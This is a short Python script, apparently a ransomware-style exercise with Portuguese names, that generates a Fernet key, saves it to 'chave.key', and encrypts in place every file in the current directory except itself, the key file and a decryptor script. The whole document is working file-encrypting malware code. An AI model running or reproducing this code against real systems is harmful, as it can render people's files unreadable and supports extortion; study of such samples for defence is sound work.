import os 
from cryptography.fernet import Fernet

arquivos = []

key = Fernet.generate_key()

with open('chave.key' , 'wb') as chave:
    chave.write(key)

for file in os.listdir():
    if file == 'MalwerKey.py' or file == 'chave.key' or file == 'DescriptArq.py':
        continue
    if os.path.isfile(file):
        arquivos.append(file)


for file in arquivos:
    with open(file, 'rb') as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(key).encrypt(conteudo)
    with open(file, 'wb') as arquivo:
        arquivo.write(conteudo_encrypted)


